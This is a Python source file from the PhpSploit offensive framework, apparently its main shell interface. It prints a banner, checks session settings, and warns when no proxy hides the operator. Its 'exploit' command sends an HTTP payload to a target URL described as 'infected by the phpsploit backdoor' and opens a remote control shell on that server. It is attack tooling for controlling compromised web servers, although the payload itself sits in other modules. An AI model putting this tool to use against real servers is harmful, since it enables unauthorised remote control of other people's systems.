
from functions       import *
from interface       import core
from interface.func  import *

class Start(core.CoreShell):
    """PhpSploit Main Shell Interface:
    This class, which inherits from the CoreShell interface, provides
    the main shell specificities, such as the mainn shell dedicated
    shell commands.
    """
    shell_name = 'main'


    def __init__(self):
        """Explicitly load the CoreShell's __init__ method"""
        core.CoreShell.__init__(self)


    def preloop(self):
        self.run('clear')

        softwareLogo  = getpath('framework/misc/logo.ascii').read().rstrip()
        introduction  = getpath('framework/misc/intro.msg').read().strip()
        startMessage  = getpath('framework/misc/messages.lst').randline()

        # print intro and help
        print softwareLogo
        print ''
        print color(1)
        print introduction
        print color(0,37)
        print startMessage+color(0)
        self.run('help')

        # inform if using session
        if 'SAVEFILE' in self.CNF['SET']:
            print(P_inf+"Using session file "+
                  quot(self.CNF['SET']['SAVEFILE']))

            # alert if saved session settings doesn't
            # comply anymore with requirements:
            from usr import settings
            if not settings.comply(self.CNF['SET']):
                print(P_inf+"Please change your outdated"
                      " settings with the 'set' command.")

        # alert if no proxy
        if self.CNF['SET']['PROXY'].lower() in ['','none']:
            print(P_err+'No proxy gateway ! stay careful...')

        # add empty LNK if don't exist
        if not 'LNK' in self.CNF:
            self.CNF['LNK'] = dict()

        # update the LNK
        self.CNF['LNK'] = update_opener(self.CNF)



    ########################
    ### COMMAND: exploit ###
    def do_exploit(self, cmd):
        """Drop a shell from target server

        This command opens the remote shell.
        He sends an http request to the focused url (the one
        defined by the "TARGET" setting), and opens the
        remote shell if the dynamic payload ran.
        """

        """Run remote server control

        SYNOPSIS:
            exploit

        DESCRIPTION:
            Send an HTTP request to the remote server's url, defined
            by the TARGET setting. This first request will try to
            execute the phpsploit's base payload, which retrieves some
            fundamental informations concerning the remote server, such
            as the server signature, and php environment. Il also
            uses the caught informations to determine some environment
            variables, such as CWD or WEB_ROOT.

            NOTE: The TARGET setting must be a remote http(s) url which
            has been infected by the phpsploit backdoor payload.
            Take a look at the documentation (rtfm command), and also
            the "infect" command.
        """

        # if the target url is correcly defined
        if 'URL' in self.CNF['LNK']:
            print(P_inf+'Sending http payload...')
            # try to estabilish a link with the remote server
            from network import server
            link = server.Link(self.CNF)
            if link.open():
                # open the remote exploitation shell at success
                self.CNF['SRV'] = link.srv_vars
                from interface import remoteshell
                shell = remoteshell.Start()
                shell.CNF = self.CNF
                shell.cmdloop()
                link.close()
        # inform the user if the TARGET setting is no correctly set
        else:
            print(P_err+"Undefined target, please enable"
                  " it with 'set TARGET <backdoored-url>")

